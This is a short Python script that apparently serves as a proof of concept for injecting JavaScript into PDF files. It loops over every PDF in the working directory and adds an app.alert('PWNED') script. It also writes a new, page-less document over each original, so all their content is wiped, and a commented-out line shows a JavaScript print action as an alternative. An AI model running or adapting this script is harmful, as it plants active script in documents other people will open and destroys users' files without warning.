from PyPDF2 import PdfFileWriter, PdfFileReader
import glob
listOfFiles = glob.glob("*.pdf")
for i in listOfFiles:
    output = PdfFileWriter()
    ipdf = PdfFileReader(open(f'{i}', 'rb'))

    with open(f'{i}', 'wb') as f:
        print(i)
        output.addJS("app.alert('PWNED', 3);")
        output.write(f)





    # mypdf.addJS("this.print({bUI:true,bSilent:false,bShrinkToFit:true});")